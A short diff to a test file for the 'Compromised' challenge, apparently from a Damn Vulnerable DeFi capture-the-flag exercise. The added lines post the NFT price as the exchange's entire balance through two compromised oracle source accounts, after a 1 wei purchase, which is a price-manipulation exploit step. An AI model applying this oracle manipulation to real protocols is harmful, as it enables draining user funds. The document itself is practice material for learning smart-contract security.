@@ -59,6 +59,13 @@ describe("Compromised challenge", function () {
     //buy x1 DVNFT for 1 wei
     const buyNFT1 = await exchange.connect(player).buyOne({ value: oneWei });
     await buyNFT1.wait();
+
+    //set the prices to the total balance exchange
+    const balanceExchange = await ethers.provider.getBalance(exchange.address);
+    const setPrices1 = await oracle.connect(source1).postPrice(symbol, balanceExchange);
+    await setPrices1.wait();
+    const setPrices2 = await oracle.connect(source2).postPrice(symbol, balanceExchange);
+    await setPrices2.wait();
   });
 
   after(async function () {
